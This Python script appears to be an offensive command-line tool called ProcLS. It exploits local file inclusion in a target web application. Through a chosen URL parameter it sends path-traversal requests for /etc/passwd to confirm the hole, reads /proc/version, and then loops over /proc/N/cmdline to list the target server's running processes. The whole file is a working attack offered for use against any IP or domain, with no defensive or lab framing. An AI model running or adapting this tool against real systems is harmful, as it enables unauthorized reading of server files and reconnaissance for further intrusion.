#!/usr/bin/env python3
import requests
import argparse
from colorama import init, Fore, Back, Style

init()

def print_banner():
    banner = r"""      _____                _       _____ 
     |  __ \              | |     / ____|
     | |__) | __ ___   ___| |    | (___  
     |  ___/ '__/ _ \ / __| |     \___ \ 
     | |   | | | (_) | (__| |____ ____) |
     |_|   |_|  \___/ \___|______|_____/"""
    version = "1.2.0"
    credit = f"{' ' * 34}By Abgache\n{' ' * 34}Version: {version}\n"
    print(banner)
    print(credit)

def main():
    parser = argparse.ArgumentParser(description="LFI /proc enumerator")
    parser.add_argument("target", help="IP or domain")
    parser.add_argument("-p", "--port", default=80, type=int)
    parser.add_argument("-s", "--path", default="", help="LFI base path")
    parser.add_argument("--max", default=1000, type=int)
    parser.add_argument("--param", default="file", help="LFI parameter name")

    args = parser.parse_args()

    if not args.target.startswith("http") and not args.target.startswith("https"):
        protocol = "https" if args.port == 443 else "http"
        base = f"{protocol}://{args.target}:{args.port}"
    elif args.target.startswith("http"):
        base = f"{args.target}:{args.port}"
    elif args.target.startswith("https"):
        base = f"{args.target}:{args.port}"

    bad_keywords = [
        "no such file",
        "page not found",
        "404",
        "error",
        "warning",
    ]

    print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} Target: {base}")

    test_url = f"{base}/{args.path}?{args.param}=../../../../etc/passwd"
    test = requests.get(test_url, timeout=3)

    if "root:x:" not in test.text:
        print(f"{Fore.RED}[-]{Style.RESET_ALL} LFI not confirmed (or filtered)")
        return
    else:
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} LFI confirmed")

    ver_url = f"{base}/{args.path}?{args.param}=../../../../proc/version"
    ver = requests.get(ver_url, timeout=3)
    print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} OS Version: {ver.text.strip()}\n")

    for i in range(1, args.max + 1):
        url = f"{base}/{args.path}?{args.param}=../../../../proc/{i}/cmdline"

        try:
            r = requests.get(url, timeout=3)

            content = r.text.strip().lower()
            if r.ok and r.text.strip() and content and not any(b in content for b in bad_keywords):
                print(f"\r{Fore.GREEN}[+]{Style.RESET_ALL} /proc/{i}/cmdline -> {r.text[:200]}")
            else:
                print(f"\r{Fore.RED}[-]{Style.RESET_ALL} /proc/{i}/cmdline -> No data", end="")

        except requests.RequestException:
            continue

if __name__ == "__main__":
    print_banner()
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*]{Style.RESET_ALL} Ctrl+C detected! Leaving... ")
        exit(0)
    except requests.exceptions.Timeout:
        try:
            r = requests.get("http://8.8.8.8", timeout=3)
            print(f"\n{Fore.RED}[-]{Style.RESET_ALL} The host is not responding, the host is most likely down.")
        except:
            print(f"\n{Fore.RED}[-]{Style.RESET_ALL} The host is not responding, please check your internet connection.")
    except requests.RequestException as e:
        print(f"\n{Fore.RED}[-]{Style.RESET_ALL} Request error: {e}")
    except Exception as e:
        print(f"\n{Fore.RED}[-]{Style.RESET_ALL} Unexpected error: {e}")